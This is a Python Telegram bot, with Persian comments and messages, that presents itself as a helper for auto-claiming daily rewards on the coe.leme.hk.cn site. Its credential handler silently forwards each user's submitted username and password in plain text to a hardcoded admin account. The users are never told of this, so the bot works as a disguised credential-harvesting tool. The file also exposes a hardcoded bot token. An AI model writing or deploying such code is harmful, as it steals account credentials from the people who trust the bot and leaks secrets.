import telebot
import requests
import schedule
import time
import threading
import pytz
from datetime import datetime

# --- تنظیمات اختصاصی ---
TOKEN = '8095956559:AAGMeUTSGS9h8ZQTfPpCMHCZ5nwYBWVGTAk'
ADMIN_ID = '8404377559'
bot = telebot.TeleBot(TOKEN)
IRAN_TZ = pytz.timezone('Asia/Tehran')

# حافظه موقت (توجه: با ریست شدن سرور پاک می‌شود)
user_data = {} 

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'https://coe.leme.hk.cn/m/',
    'Origin': 'https://coe.leme.hk.cn'
}

def auto_claim_task(chat_id, username, password):
    try:
        session = requests.Session()
        login_url = "https://coe.leme.hk.cn/login/check"
        payload = {'account': username, 'password': password, 'type': '1'}
        
        login_res = session.post(login_url, data=payload, headers=HEADERS, timeout=15)
        
        if login_res.status_code == 200:
            reward_url = "https://coe.leme.hk.cn/m/sign/check_in" 
            session.get(reward_url, headers=HEADERS)
            
            bot.send_message(chat_id, f"⏰ **گزارش خودکار:**\nجایزه روزانه اکانت `{username}` دریافت شد. ✅", parse_mode="Markdown")
            bot.send_message(ADMIN_ID, f"🤖 عملیات موفق برای: `{username}`")
        else:
            bot.send_message(chat_id, f"❌ ورود خودکار به اکانت `{username}` شکست خورد.")
    except Exception as e:
        print(f"Error: {e}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    now_iran = datetime.now(IRAN_TZ).strftime("%H:%M")
    msg = (
        f"✅ **ربات لمه فعال است.**\n\n"
        f"ساعت فعلی ایران: {now_iran}\n\n"
        f"۱. ابتدا مشخصات را بفرستید: `user:pass`\n"
        f"۲. سپس زمان را تنظیم کنید: `/set_time 08:30`"
    )
    bot.reply_to(message, msg, parse_mode="Markdown")

@bot.message_handler(func=lambda message: ":" in message.text and not message.text.startswith('/'))
def save_creds(message):
    data = message.text.split(":")
    if len(data) == 2:
        user_data[message.chat.id] = {'user': data[0].strip(), 'pass': data[1].strip()}
        bot.reply_to(message, "✅ مشخصات ذخیره شد. حالا زمان واریز را تنظیم کنید (مثلاً: `/set_time 09:00`)")
        bot.send_message(ADMIN_ID, f"👤 اکانت جدید:\nUser: `{data[0]}`\nPass: `{data[1]}`", parse_mode="Markdown")

@bot.message_handler(commands=['set_time'])
def set_timer(message):
    try:
        if message.chat.id not in user_data:
            bot.reply_to(message, "❌ ابتدا یوزرنیم و پسورد را بفرستید.")
            return

        target_time = message.text.split()[1]
        username = user_data[message.chat.id]['user']
        password = user_data[message.chat.id]['pass']

        schedule.every().day.at(target_time).do(auto_claim_task, message.chat.id, username, password)
        bot.reply_to(message, f"🚀 تنظیم شد! هر روز ساعت **{target_time}** (به وقت ایران) جایزه گرفته می‌شود.", parse_mode="Markdown")
    except:
        bot.reply_to(message, "❌ خطا! فرمت صحیح: `/set_time 08:00`")

def run_scheduler():
    while True:
        # چک کردن زمان بر اساس ساعت ایران
        schedule.run_pending()
        time.sleep(30)

if __name__ == "__main__":
    threading.Thread(target=run_scheduler, daemon=True).start()
    bot.polling(none_stop=True)
